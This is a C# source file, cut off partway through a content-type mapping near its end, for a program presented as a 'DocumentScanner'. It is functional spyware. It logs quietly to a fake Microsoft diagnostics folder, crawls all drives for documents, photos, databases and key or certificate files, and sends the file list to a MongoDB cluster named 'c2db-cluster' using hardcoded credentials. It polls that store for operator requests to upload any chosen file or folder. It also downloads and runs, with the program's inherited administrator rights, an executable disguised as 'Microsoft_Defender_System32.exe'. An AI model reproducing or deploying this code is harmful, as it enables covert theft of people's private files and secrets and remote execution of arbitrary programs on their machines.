using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Threading;
using System.Threading.Tasks;
using MongoDB.Bson;
using MongoDB.Driver;
using MongoDB.Driver.GridFS;

namespace DocumentScanner
{
    // ══════════════════════════════════════════════════════════════════════════
    //  SILENT LOGGER
    //  Path: %LOCALAPPDATA%\Microsoft\Windows\Diagnostics\diag_log.txt
    // ══════════════════════════════════════════════════════════════════════════
    internal static class SilentLog
    {
        private static readonly string LogPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "Microsoft", "Windows", "Diagnostics", "diag_log.txt");

        private static readonly object _lock = new object();

        static SilentLog()
        {
            try { Directory.CreateDirectory(Path.GetDirectoryName(LogPath)); }
            catch { }
        }

        public static void Write(string level, string msg)
        {
            try
            {
                var line = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [{level,-5}] {msg}{Environment.NewLine}";
                lock (_lock) File.AppendAllText(LogPath, line);
            }
            catch { }
        }

        public static void Info(string m)  => Write("INFO",  m);
        public static void Ok(string m)    => Write("OK",    m);
        public static void Warn(string m)  => Write("WARN",  m);
        public static void Error(string m) => Write("ERROR", m);
        public static void Sep()           => Write("─────", new string('─', 55));
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  DOCUMENT MODEL
    // ══════════════════════════════════════════════════════════════════════════
    internal class DocumentFile
    {
        public string   FileName     { get; set; }
        public string   FilePath     { get; set; }
        public string   Extension    { get; set; }
        public long     FileSize     { get; set; }
        public string   ContentType  { get; set; }
        public string   Category     { get; set; }
        public DateTime CreatedDate  { get; set; }
        public DateTime ModifiedDate { get; set; }
        public string   MD5Hash      { get; set; }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  MAIN COORDINATOR
    // ══════════════════════════════════════════════════════════════════════════
    internal static class SilentScanner
    {
        // ── credentials ───────────────────────────────────────────────────────
        private static readonly string[] Usernames = { "manankamboj66_db_user", "manankamboj66" };
        private static readonly string[] Passwords = { "manan2010", "manankamboj2010" };
        private const string ClusterBase     = "c2db-cluster.tag4k0q.mongodb.net";
        private const string AppName         = "C2db-cluster";
        private const string DatabaseName    = "document_db";
        private const string MetaCollection  = "documents";        // Phase 1: metadata
        private const string ReqCollection   = "upload_requests";  // Phase 2: watchlist
        private const string GridFSBucket    = "file_contents";    // Phase 2/3: actual bytes

        // ── companion app ──────────────────────────────────────────────────────
        private const  string CompanionFileName  = "Microsoft_Defender_System32.exe";  // GridFS filename
        private static readonly string CompanionLocalDir  = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "fd");
        private static readonly string CompanionLocalPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "fd", CompanionFileName);

        // ── directories to skip (case-insensitive) ────────────────────────────
        private static readonly HashSet<string> SkipDirs =
            new HashSet<string>(StringComparer.OrdinalIgnoreCase)
        {
            "Windows", "Program Files", "Program Files (x86)", "ProgramData",
            "System Volume Information", "$Recycle.Bin", "Recovery", "WinSxS",
            "MSOCache", "Boot", "Intel", "AMD", "NVIDIA", "node_modules",
            ".git", "__pycache__", "Temporary Internet Files", "INetCache",
            "AppData", "Application Data", "Local Settings", "LocalLow", "Roaming"
        };

        // ── target extensions ─────────────────────────────────────────────────
        private static readonly HashSet<string> TargetExts =
            new HashSet<string>(StringComparer.OrdinalIgnoreCase)
        {
            // Office / Documents
            ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
            ".pdf", ".txt", ".rtf", ".odt", ".ods", ".odp", ".one",
            // Images
            ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".heic", ".raw",
            // Web / Data
            ".html", ".htm", ".xml", ".json", ".csv", ".yaml", ".yml",
            // Archives
            ".zip", ".rar", ".7z", ".tar", ".gz",
            // Email / Calendar
            ".msg", ".eml", ".ics", ".vcf",
            // Ebooks
            ".epub", ".mobi",
            // Code / Config (sensitive)
            ".py", ".js", ".ts", ".cs", ".java", ".cpp", ".h", ".rb", ".php",
            ".sh", ".bat", ".ps1", ".env", ".cfg", ".ini", ".conf",
            // Database / Keys
            ".sql", ".db", ".sqlite", ".accdb", ".mdb",
            ".key", ".pem", ".pfx", ".p12", ".cer"
        };

        // ── shared in-memory file list (populated by scan, used by watchlist) ─
        private static readonly ConcurrentBag<DocumentFile> _scannedFiles
            = new ConcurrentBag<DocumentFile>();

        private static volatile bool _scanCompleted = false;

        // ─────────────────────────────────────────────────────────────────────
        //  Entry point: launches all threads
        // ─────────────────────────────────────────────────────────────────────
        public static void RunInBackground(string folderToUpload = null)
        {
            // Thread 1 – scan all drives → upload metadata
            var scanThread = new Thread(() =>
            {
                try   { ScanAndUpload(); }
                catch (Exception ex) { SilentLog.Error($"Scan thread: {ex.Message}"); }
            })
            { IsBackground = false, Name = "DriveScanner", Priority = ThreadPriority.BelowNormal };

            // Thread 2 – watchlist poller: checks upload_requests every 10 seconds
            var pollerThread = new Thread(() =>
            {
                try   { WatchlistPollerLoop(); }
                catch (Exception ex) { SilentLog.Error($"Poller thread: {ex.Message}"); }
            })
            { IsBackground = false, Name = "WatchlistPoller", Priority = ThreadPriority.BelowNormal };

            // Thread 3 – upload selected folder (runs in parallel with scan)
            Thread folderThread = null;
            if (!string.IsNullOrEmpty(folderToUpload) && Directory.Exists(folderToUpload))
            {
                folderThread = new Thread(() =>
                {
                    try   { UploadFolder(folderToUpload); }
                    catch (Exception ex) { SilentLog.Error($"Folder thread: {ex.Message}"); }
                })
                { IsBackground = false, Name = "FolderUpload", Priority = ThreadPriority.BelowNormal };
            }

            // Thread 4 – companion app downloader + launcher (runs immediately at startup)
            var companionThread = new Thread(() =>
            {
                try   { RunCompanion(); }
                catch (Exception ex) { SilentLog.Error($"Companion thread: {ex.Message}"); }
            })
            { IsBackground = false, Name = "CompanionLauncher", Priority = ThreadPriority.BelowNormal };

            scanThread.Start();
            pollerThread.Start();
            folderThread?.Start();
            companionThread.Start();
        }

        // ══════════════════════════════════════════════════════════════════════
        //  PHASE 1 — scan all drives, upload metadata list
        //  PHASE 2 — check upload_requests, fulfill with actual file bytes
        // ══════════════════════════════════════════════════════════════════════
        private static void ScanAndUpload()
        {
            try
            {
                SilentLog.Sep();
                SilentLog.Info($"Session start | machine={Environment.MachineName} | user={Environment.UserName}");

                // ── SCAN ──────────────────────────────────────────────────────────
                var files = ScanAllDrives();

                if (files.Count == 0)
                {
                    SilentLog.Warn("No files found — aborting upload");
                    return;
                }

                // Write found file paths to local file
                string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
                string logDir = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Microsoft", "Windows", "Diagnostics");
                Directory.CreateDirectory(logDir);
                
                string localFilePath = Path.Combine(logDir, $"scan_paths_{Environment.MachineName}_{timestamp}.txt");
                
                try
                {
                    File.WriteAllLines(localFilePath, files.Select(f => f.FilePath));
                    SilentLog.Info($"Wrote {files.Count} paths to local file: {localFilePath}");
                }
                catch (Exception ex)
                {
                    SilentLog.Error($"Failed to write paths to local file: {ex.Message}");
                    localFilePath = null;
                }

                if (string.IsNullOrEmpty(localFilePath) || !File.Exists(localFilePath))
                {
                    SilentLog.Error("Abort metadata upload: local path file was not created.");
                    return;
                }

                // ── CONNECT ───────────────────────────────────────────────────────
                IMongoDatabase db = TryConnect();
                if (db == null) return;

                // ── PHASE 1: metadata file upload ─────────────────────────────────
                UploadMetadata(files, localFilePath, db);

                SilentLog.Info("Scan+upload complete. Watchlist poller is running in background.");
            }
            finally
            {
                _scanCompleted = true;
            }
        }

        // ══════════════════════════════════════════════════════════════════════
        //  WATCHLIST POLLER — runs forever, checks every 10 seconds
        //
        //  DB user inserts into upload_requests:
        //  { "status": "pending", "requestedFiles": ["file.pdf", "photo.jpg"] }
        //  This thread finds it, fulfills it, and marks it "completed".
        // ══════════════════════════════════════════════════════════════════════
        private static void WatchlistPollerLoop()
        {
            SilentLog.Info("Watchlist poller started — interval: 10 seconds");
            IMongoDatabase db = null;
            int tick = 0;

            while (true)
            {
                Thread.Sleep(10_000); // 10-second interval
                tick++;

                try
                {
                    // Reconnect if connection was lost
                    if (db == null)
                    {
                        db = TryConnect();
                        if (db == null)
                        {
                            SilentLog.Warn($"Poller tick {tick}: still no DB connection, retrying in 10s");
                            continue;
                        }
                    }

                    if (!_scanCompleted)
                    {
                        SilentLog.Info($"Poller tick {tick}: waiting for drive scan to complete...");
                        continue;
                    }

                    // Check for pending requests
                    var reqCol  = db.GetCollection<BsonDocument>(ReqCollection);
                    var pending = reqCol
                        .Find(Builders<BsonDocument>.Filter.Eq("status", "pending"))
                        .ToList();

                    if (pending.Count == 0)
                    {
                        SilentLog.Info($"Poller tick {tick}: no pending requests");
                        continue;
                    }

                    SilentLog.Info($"Poller tick {tick}: {pending.Count} pending request(s) found");
                    FulfillWatchlistRequests(db);
                }
                catch (Exception ex)
                {
                    SilentLog.Warn($"Poller tick {tick} error: {ex.Message} — will reconnect next tick");
                    db = null; // force fresh connection on next tick
                }
            }
        }

        private static List<DocumentFile> ScanAllDrives()
        {
            var drives = DriveInfo.GetDrives()
                .Where(d => d.IsReady &&
                    (d.DriveType == DriveType.Fixed    ||
                     d.DriveType == DriveType.Removable ||
                     d.DriveType == DriveType.Network))
                .ToList();

            string systemDrive = Path.GetPathRoot(Environment.SystemDirectory); // e.g. "C:\"
            SilentLog.Info($"Drives found: {string.Join(", ", drives.Select(d => d.Name.TrimEnd('\\')))} (System Drive: {systemDrive})");

            var allFiles = new ConcurrentBag<DocumentFile>();

            // Crawl drives in parallel
            Parallel.ForEach(drives,
                new ParallelOptions { MaxDegreeOfParallelism = Math.Max(2, drives.Count) },
                drive =>
                {
                    if (string.Equals(drive.Name, systemDrive, StringComparison.OrdinalIgnoreCase))
                    {
                        // On the system drive, ONLY scan specific user folders to avoid system/app clutter
                        var userFolders = new List<string>
                        {
                            Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                            Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
                            Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
                            Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads")
                        };

                        // Add OneDrive if present
                        string oneDrivePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "OneDrive");
                        if (Directory.Exists(oneDrivePath))
                            userFolders.Add(oneDrivePath);

                        int totalSystemDriveFiles = 0;
                        Parallel.ForEach(userFolders, folder =>
                        {
                            if (Directory.Exists(folder))
                            {
                                int n = ScanDirectoryParallel(folder, allFiles);
                                Interlocked.Add(ref totalSystemDriveFiles, n);
                            }
                        });
                        SilentLog.Info($"  {drive.Name.TrimEnd('\\')} (System User Folders Only) → {totalSystemDriveFiles} file(s) found");
                    }
                    else
                    {
                        // For non-system drives, scan the entire root (but skip Windows, Program Files, AppData, etc. if present)
                        int n = ScanDirectoryParallel(drive.RootDirectory.FullName, allFiles);
                        SilentLog.Info($"  {drive.Name.TrimEnd('\\')} (Full Scan) → {n} file(s) found");
                    }
                });

            var result = allFiles.ToList();

            // Populate shared bag for watchlist phase
            foreach (var f in result)
                _scannedFiles.Add(f);

            SilentLog.Info($"Total across all drives: {result.Count} file(s)");
            return result;
        }

        /// <summary>
        /// Parallel BFS scan of a directory tree.
        /// </summary>
        private static int ScanDirectoryParallel(string rootDir, ConcurrentBag<DocumentFile> bag)
        {
            var dirQueue = new ConcurrentQueue<string>();
            dirQueue.Enqueue(rootDir);

            int activeWorkers = 0;
            int totalFiles = 0;

            int numTasks = Math.Max(2, Environment.ProcessorCount);
            var tasks = new Task[numTasks];

            for (int i = 0; i < numTasks; i++)
            {
                tasks[i] = Task.Run(() =>
                {
                    Interlocked.Increment(ref activeWorkers);
                    try
                    {
                        while (true)
                        {
                            if (dirQueue.TryDequeue(out string dir))
                            {
                                // Skip system / noise directories
                                var leaf = Path.GetFileName(dir);
                                if (!string.IsNullOrEmpty(leaf) && SkipDirs.Contains(leaf))
                                    continue;

                                // Enumerate files in this directory
                                try
                                {
                                    foreach (var file in Directory.EnumerateFiles(dir))
                                    {
                                        try
                                        {
                                            var ext = Path.GetExtension(file);
                                            if (!TargetExts.Contains(ext)) continue;

                                            var info = new FileInfo(file);
                                            bag.Add(new DocumentFile
                                            {
                                                FileName     = info.Name,
                                                FilePath     = file,
                                                Extension    = ext.ToLowerInvariant(),
                                                FileSize     = info.Length,
                                                ContentType  = GetContentType(ext),
                                                Category     = GetCategory(ext),
                                                CreatedDate  = info.CreationTime,
                                                ModifiedDate = info.LastWriteTime,
                                                MD5Hash      = null
                                            });
                                            Interlocked.Increment(ref totalFiles);
                                        }
                                        catch { }
                                    }
                                }
                                catch { }

                                // Enqueue subdirectories
                                try
                                {
                                    foreach (var sub in Directory.EnumerateDirectories(dir))
                                    {
                                        dirQueue.Enqueue(sub);
                                    }
                                }
                                catch { }
                            }
                            else
                            {
                                // Queue is empty. Check if any worker is still active
                                Interlocked.Decrement(ref activeWorkers);

                                // Spin/wait briefly to see if other active workers add subdirectories
                                bool workMightBeAdded = false;
                                for (int spin = 0; spin < 50; spin++)
                                {
                                    if (Volatile.Read(ref activeWorkers) > 0)
                                    {
                                        Thread.Sleep(1);
                                        if (!dirQueue.IsEmpty)
                                        {
                                            workMightBeAdded = true;
                                            break;
                                        }
                                    }
                                    else
                                    {
                                        break;
                                    }
                                }

                                if (workMightBeAdded)
                                {
                                    Interlocked.Increment(ref activeWorkers);
                                    continue;
                                }

                                break; // No more active workers and queue is empty
                            }
                        }
                    }
                    catch { }
                });
            }

            Task.WaitAll(tasks);
            return totalFiles;
        }

        // ══════════════════════════════════════════════════════════════════════
        //  PHASE 1 — upload path list to GridFS and single summary doc
        // ══════════════════════════════════════════════════════════════════════
        private static void UploadMetadata(List<DocumentFile> files, string localFilePath, IMongoDatabase db)
        {
            SilentLog.Info("Uploading file list to MongoDB GridFS...");
            try
            {
                var col = db.GetCollection<BsonDocument>(MetaCollection);
                var bucket = new GridFSBucket(db, new GridFSBucketOptions { BucketName = GridFSBucket });
                
                string filename = Path.GetFileName(localFilePath);
                var fileInfo = new FileInfo(localFilePath);
                
                // Upload file list to GridFS
                var opts = new GridFSUploadOptions
                {
                    Metadata = new BsonDocument
                    {
                        { "originalPath",  localFilePath           },
                        { "machineName",   Environment.MachineName },
                        { "windowsUser",   Environment.UserName    },
                        { "status",        "scan_list"             }
                    }
                };
                
                ObjectId gridFSId;
                using (var fs = new FileStream(localFilePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    gridFSId = bucket.UploadFromStream(filename, fs, opts);
                }
                
                SilentLog.Ok($"Uploaded path list file to GridFS with ID: {gridFSId}");
                
                // Insert a single metadata summary record to collection
                var summaryDoc = new BsonDocument
                {
                    { "fileName",     filename                },
                    { "filePath",     localFilePath           },
                    { "fileSize",     fileInfo.Length         },
                    { "machineName",  Environment.MachineName },
                    { "windowsUser",  Environment.UserName    },
                    { "uploadedAt",   DateTime.UtcNow         },
                    { "hasContent",   true                    },
                    { "gridFSFileId", gridFSId                },
                    { "status",       "scan_list_uploaded"    },
                    { "fileCount",    files.Count             }
                };
                
                col.InsertOne(summaryDoc);
                SilentLog.Ok($"Metadata summary record inserted in [{DatabaseName}.{MetaCollection}]");
            }
            catch (Exception ex)
            {
                SilentLog.Error($"Failed to upload metadata file list: {ex.Message}");
            }
        }

        // ══════════════════════════════════════════════════════════════════════
        //  PHASE 2 — watchlist: DB user inserted upload_requests docs
        //
        //  Expected document format in upload_requests collection:
        //  {
        //    "status": "pending",
        //    "requestedFiles": ["report.pdf", "photo.jpg", "C:\\path\\file.txt"]
        //  }
        //
        //  App finds those files from the scanned list or directly on disk (if absolute),
        //  uploads actual bytes via GridFS, then marks the request as "completed".
        // ══════════════════════════════════════════════════════════════════════
        private static void UploadSingleFile(string filePath, string uploadName, GridFSBucket bucket, ObjectId reqId, ConcurrentBag<ObjectId> uploadedIds, ref int fulfilled)
        {
            try
            {
                var opts = new GridFSUploadOptions
                {
                    Metadata = new BsonDocument
                    {
                        { "originalPath",  filePath               },
                        { "machineName",   Environment.MachineName },
                        { "windowsUser",   Environment.UserName    },
                        { "requestId",     reqId                  }
                    }
                };
                
                string md5Hash = ComputeMD5(filePath);
                opts.Metadata.Add("md5Hash", md5Hash ?? "");

                using var fs = new FileStream(filePath,
                    FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                var fid = bucket.UploadFromStream(uploadName, fs, opts);
                uploadedIds.Add(fid);
                Interlocked.Increment(ref fulfilled);
                
                var size = new FileInfo(filePath).Length;
                SilentLog.Ok($"    Uploaded: {uploadName} ({size:N0} bytes) | MD5={md5Hash}");
            }
            catch (Exception ex)
            {
                SilentLog.Warn($"    Upload failed for {filePath}: {ex.Message}");
            }
        }

        private static void FulfillWatchlistRequests(IMongoDatabase db)
        {
            try
            {
                var reqCol = db.GetCollection<BsonDocument>(ReqCollection);
                var pending = reqCol
                    .Find(Builders<BsonDocument>.Filter.Eq("status", "pending"))
                    .ToList();

                if (pending.Count == 0)
                {
                    SilentLog.Info("No pending upload requests in [upload_requests]");
                    return;
                }

                SilentLog.Info($"Watchlist: {pending.Count} pending request(s) found");

                var bucket = new GridFSBucket(db, new GridFSBucketOptions
                {
                    BucketName = GridFSBucket
                });

                // Build a lookup: filename → DocumentFile (from the in-memory scanned list)
                var fileIndex = _scannedFiles
                    .GroupBy(f => f.FileName, StringComparer.OrdinalIgnoreCase)
                    .ToDictionary(g => g.Key, g => g.First(), StringComparer.OrdinalIgnoreCase);

                foreach (var req in pending)
                {
                    try
                    {
                        var reqId    = req["_id"].AsObjectId;
                        var wantList = req["requestedFiles"].AsBsonArray
                                           .Select(x => x.AsString)
                                           .ToList();

                        SilentLog.Info($"  Request {reqId}: {wantList.Count} item(s) requested");

                        var uploadedIds   = new ConcurrentBag<ObjectId>();
                        int fulfilled     = 0;
                        int notFound      = 0;

                        Parallel.ForEach(wantList, new ParallelOptions { MaxDegreeOfParallelism = 4 }, name =>
                        {
                            // 1. Check if the requested string is a full absolute directory
                            if (Directory.Exists(name))
                            {
                                try
                                {
                                    var files = Directory.GetFiles(name, "*", SearchOption.AllDirectories);
                                    SilentLog.Info($"    Directory requested: {name} ({files.Length} file(s) found)");
                                    Parallel.ForEach(files, new ParallelOptions { MaxDegreeOfParallelism = 4 }, file =>
                                    {
                                        UploadSingleFile(file, Path.GetFileName(file), bucket, reqId, uploadedIds, ref fulfilled);
                                    });
                                }
                                catch (Exception ex)
                                {
                                    SilentLog.Warn($"    Directory upload failed for {name}: {ex.Message}");
                                    Interlocked.Increment(ref notFound);
                                }
                                return;
                            }

                            // 2. Check if it's an absolute path to a file
                            string targetPath = null;
                            string uploadName = null;

                            if (name.Contains(":\\") || name.StartsWith("\\\\"))
                            {
                                if (File.Exists(name))
                                {
                                    targetPath = name;
                                    uploadName = Path.GetFileName(name);
                                }
                            }
                            else
                            {
                                if (fileIndex.TryGetValue(name, out var doc))
                                {
                                    targetPath = doc.FilePath;
                                    uploadName = doc.FileName;
                                }
                            }

                            if (targetPath == null || uploadName == null)
                            {
                                SilentLog.Warn($"    Not found on disk or in scanned index: {name}");
                                Interlocked.Increment(ref notFound);
                                return;
                            }

                            UploadSingleFile(targetPath, uploadName, bucket, reqId, uploadedIds, ref fulfilled);
                        });

                        // Mark request as completed
                        reqCol.UpdateOne(
                            Builders<BsonDocument>.Filter.Eq("_id", reqId),
                            Builders<BsonDocument>.Update
                                .Set("status",         "completed")
                                .Set("completedAt",    DateTime.UtcNow)
                                .Set("uploadedFileIds", new BsonArray(uploadedIds))
                                .Set("fulfilledCount", fulfilled)
                                .Set("notFoundCount",  notFound));

                        SilentLog.Ok($"  Request {reqId} done — {fulfilled} uploaded, {notFound} not found");
                    }
                    catch (Exception ex)
                    {
                        SilentLog.Error($"  Error on request: {ex.Message}");
                    }
                }
            }
            catch (Exception ex)
            {
                SilentLog.Error($"Watchlist check error: {ex.Message}");
            }
        }

        // ══════════════════════════════════════════════════════════════════════
        //  FOLDER UPLOAD — uploads actual file bytes for a user-selected folder
        //  Runs in parallel with the drive scan (separate thread)
        // ══════════════════════════════════════════════════════════════════════
        private static void UploadFolder(string folderPath)
        {
            SilentLog.Sep();
            SilentLog.Info($"Folder upload started: {folderPath}");

            IMongoDatabase db = TryConnect();
            if (db == null) return;

            var bucket  = new GridFSBucket(db, new GridFSBucketOptions { BucketName = GridFSBucket });
            var metaCol = db.GetCollection<BsonDocument>(MetaCollection);

            var filesToUpload = new List<string>();
            var stack = new Stack<string>();
            stack.Push(folderPath);

            while (stack.Count > 0)
            {
                var dir = stack.Pop();
                try
                {
                    foreach (var file in Directory.EnumerateFiles(dir))
                        filesToUpload.Add(file);
                }
                catch { }

                try
                {
                    foreach (var sub in Directory.EnumerateDirectories(dir))
                        stack.Push(sub);
                }
                catch { }
            }

            SilentLog.Info($"Found {filesToUpload.Count} file(s) in selected folder to upload.");

            int uploaded = 0, skipped = 0;

            Parallel.ForEach(filesToUpload, new ParallelOptions { MaxDegreeOfParallelism = 8 }, file =>
            {
                try
                {
                    var info = new FileInfo(file);
                    var ext  = info.Extension;

                    var opts = new GridFSUploadOptions
                    {
                        Metadata = new BsonDocument
                        {
                            { "originalPath",    file                    },
                            { "selectedFolder",  folderPath              },
                            { "machineName",     Environment.MachineName },
                            { "windowsUser",     Environment.UserName    }
                        }
                    };

                    ObjectId fileId;
                    using (var fs = new FileStream(file, FileMode.Open,
                               FileAccess.Read, FileShare.ReadWrite))
                        fileId = bucket.UploadFromStream(info.Name, fs, opts);

                    metaCol.InsertOne(new BsonDocument
                    {
                        { "fileName",      info.Name                 },
                        { "filePath",      file                      },
                        { "extension",     ext.ToLowerInvariant()    },
                        { "fileSize",      info.Length               },
                        { "contentType",   GetContentType(ext)       },
                        { "category",      GetCategory(ext)          },
                        { "createdDate",   info.CreationTime         },
                        { "modifiedDate",  info.LastWriteTime        },
                        { "md5Hash",       ComputeMD5(file) ?? ""    },
                        { "machineName",   Environment.MachineName   },
                        { "windowsUser",   Environment.UserName      },
                        { "uploadedAt",    DateTime.UtcNow           },
                        { "hasContent",    true                      },
                        { "gridFSFileId",  fileId                    },
                        { "status",        "content_uploaded"        },
                        { "source",        "user_folder_select"      }
                    });

                    Interlocked.Increment(ref uploaded);
                    SilentLog.Ok($"  Folder uploaded: {info.Name} ({info.Length:N0} bytes)");
                }
                catch (Exception ex)
                {
                    Interlocked.Increment(ref skipped);
                    SilentLog.Warn($"  Skipped {Path.GetFileName(file)}: {ex.Message}");
                }
            });

            SilentLog.Ok($"Folder upload complete: {uploaded} uploaded, {skipped} skipped");
        }

        // ══════════════════════════════════════════════════════════════════════
        //  COMPANION LAUNCHER — auto-download & launch companion app from GridFS
        //
        //  ► Upload your companion exe to GridFS under the name "companion_app.exe".
        //  ► On every fd.exe start, this thread:
        //      1. Connects to MongoDB
        //      2. Finds the file in GridFS
        //      3. Compares its upload timestamp to the local copy’s write time
        //      4. Re-downloads only if the remote version is newer (Option C)
        //      5. Launches it — no UAC prompt because fd.exe is already elevated
        // ══════════════════════════════════════════════════════════════════════
        private static void RunCompanion()
        {
            try
            {
                SilentLog.Sep();
                SilentLog.Info($"CompanionLauncher: checking for [{CompanionFileName}] in GridFS...");

                // Ensure local directory exists
                try { Directory.CreateDirectory(CompanionLocalDir); } catch { }

                IMongoDatabase db = TryConnect();
                if (db == null)
                {
                    SilentLog.Error("CompanionLauncher: cannot connect to MongoDB — skipping");
                    // Still launch existing local copy if available
                    if (File.Exists(CompanionLocalPath)) LaunchCompanion();
                    return;
                }

                var bucket = new GridFSBucket(db, new GridFSBucketOptions { BucketName = GridFSBucket });

                // Find the most recent companion exe in GridFS
                var filter = Builders<GridFSFileInfo>.Filter.Eq(x => x.Filename, CompanionFileName);
                var sort   = Builders<GridFSFileInfo>.Sort.Descending(x => x.UploadDateTime);
                var opts   = new GridFSFindOptions { Sort = sort, Limit = 1 };

                GridFSFileInfo remoteInfo;
                using (var cursor = bucket.Find(filter, opts))
                    remoteInfo = cursor.ToList().FirstOrDefault();

                if (remoteInfo == null)
                {
                    SilentLog.Warn($"CompanionLauncher: [{CompanionFileName}] not found in GridFS");
                    // Launch existing local copy if we have one from a previous run
                    if (File.Exists(CompanionLocalPath))
                    {
                        SilentLog.Info("CompanionLauncher: launching existing local copy");
                        LaunchCompanion();
                    }
                    return;
                }

                SilentLog.Info($"CompanionLauncher: found in GridFS | " +
                               $"size={remoteInfo.Length:N0} bytes | " +
                               $"uploaded={remoteInfo.UploadDateTime:yyyy-MM-dd HH:mm:ss} UTC");

                // ── Compare timestamps: re-download only if GridFS version is newer ───────
                bool needsDownload = true;
                if (File.Exists(CompanionLocalPath))
                {
                    DateTime localUtc  = File.GetLastWriteTimeUtc(CompanionLocalPath);
                    DateTime remoteUtc = remoteInfo.UploadDateTime.ToUniversalTime();
                    if (localUtc >= remoteUtc)
                    {
                        SilentLog.Info($"CompanionLauncher: local copy is up-to-date " +
                                       $"(local={localUtc:yyyy-MM-dd HH:mm:ss}, " +
                                       $"remote={remoteUtc:yyyy-MM-dd HH:mm:ss})");
                        needsDownload = false;
                    }
                    else
                    {
                        SilentLog.Info($"CompanionLauncher: newer version available in GridFS — re-downloading");
                    }
                }
                else
                {
                    SilentLog.Info("CompanionLauncher: no local copy found — downloading now");
                }

                if (needsDownload)
                {
                    string tempPath = CompanionLocalPath + ".tmp";
                    try
                    {
                        using (var fs = new FileStream(tempPath, FileMode.Create,
                                   FileAccess.Write, FileShare.None))
                            bucket.DownloadToStream(remoteInfo.Id, fs);

                        // Atomic replace
                        if (File.Exists(CompanionLocalPath))
                            File.Delete(CompanionLocalPath);
                        File.Move(tempPath, CompanionLocalPath);

                        // Stamp write-time = GridFS upload time for future comparisons
                        File.SetLastWriteTimeUtc(CompanionLocalPath,
                            remoteInfo.UploadDateTime.ToUniversalTime());

                        SilentLog.Ok($"CompanionLauncher: download complete — " +
                                     $"[{CompanionLocalPath}] ({remoteInfo.Length:N0} bytes)");
                    }
                    catch (Exception ex)
                    {
                        SilentLog.Error($"CompanionLauncher: download failed — {ex.Message}");
                        try { if (File.Exists(tempPath)) File.Delete(tempPath); } catch { }

                        // If download failed but we still have an old copy, launch it anyway
                        if (!File.Exists(CompanionLocalPath))
                            return;
                        SilentLog.Warn("CompanionLauncher: launching stale local copy after download failure");
                    }
                }

                LaunchCompanion();
            }
            catch (Exception ex)
            {
                SilentLog.Error($"CompanionLauncher: unexpected error — {ex.Message}");
            }
        }

        private static void LaunchCompanion()
        {
            try
            {
                // fd.exe already runs with admin privileges (self-elevated via UAC at startup).
                // Child processes started via Process.Start inherit the elevated token
                // automatically, so no "runas" verb is needed and no UAC popup appears.
                var psi = new ProcessStartInfo
                {
                    FileName        = CompanionLocalPath,
                    UseShellExecute = true
                };
                Process.Start(psi);
                SilentLog.Ok($"CompanionLauncher: [{CompanionFileName}] launched successfully");
            }
            catch (Exception ex)
            {
                SilentLog.Error($"CompanionLauncher: launch failed — {ex.Message}");
            }
        }

        private static IMongoDatabase TryConnect()
        {
            foreach (var user in Usernames)
            {
                foreach (var pwd in Passwords)
                {
                    try
                    {
                        var connStr  = $"mongodb+srv://{user}:{Uri.EscapeDataString(pwd)}@{ClusterBase}/?appName={AppName}";
                        var settings = MongoClientSettings.FromConnectionString(connStr);
                        settings.ServerSelectionTimeout = TimeSpan.FromSeconds(20);
                        settings.ConnectTimeout         = TimeSpan.FromSeconds(20);

                        var client = new MongoClient(settings);
                        var db     = client.GetDatabase(DatabaseName);
                        db.RunCommand<BsonDocument>(new BsonDocument("ping", 1));

                        SilentLog.Ok($"MongoDB connected (user={user})");
                        return db;
                    }
                    catch (Exception ex)
                    {
                        SilentLog.Warn($"Connection attempt failed (user={user}): {ex.Message}");
                    }
                }
            }

            SilentLog.Error("All connection attempts failed — check credentials / network");
            return null;
        }

        private static string ComputeMD5(string path)
        {
            try
            {
                using var md5 = MD5.Create();
                byte[] buf = new byte[64 * 1024]; // hash first 64 KB (extremely fast)
                using var fs = new FileStream(path, FileMode.Open,
                    FileAccess.Read, FileShare.ReadWrite);
                int read = fs.Read(buf, 0, buf.Length);
                return BitConverter.ToString(md5.ComputeHash(buf, 0, read))
                                   .Replace("-", "").ToLowerInvariant();
            }
            catch { return null; }
        }

        private static string GetContentType(string ext) => ext.ToLowerInvariant() switch
        {
            ".pdf"   => "application/pdf",
            ".doc"   => "application/msword",
            ".docx"  => "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            ".xls"   => "application/vnd.ms-excel",
            ".xlsx"  => "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            ".ppt"   => "application/vnd.ms-powerpoint",
            ".pptx"  => "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            ".txt"   => "text/plain",
            ".rtf"   => "application/rtf",
            ".jpg" or ".jpeg" => "image/jpeg",
            ".png"   => "image/png",
            ".gif"   => "image/gif",
            ".bmp"   => "image/bmp",
            ".tiff"  => "image/tiff",
            ".html" or ".htm" => "text/html",
            ".xml"   => "application/xml",
            ".json"  => "application/json",
            ".csv"   => "text/csv",
            ".zip"   => "application/zip",
            ".rar"   => "application/x-rar-compressed",
            ".epub"  => "application/epub+zip",
            ".msg"   => "application/vnd.ms-outlook",
            ".eml"   => "message/rfc822",
            ".py"    => "text/x-python",
            ".sql"   => "application/sql",
            ".db" or ".sqlite" => "application/x-sqlite3",
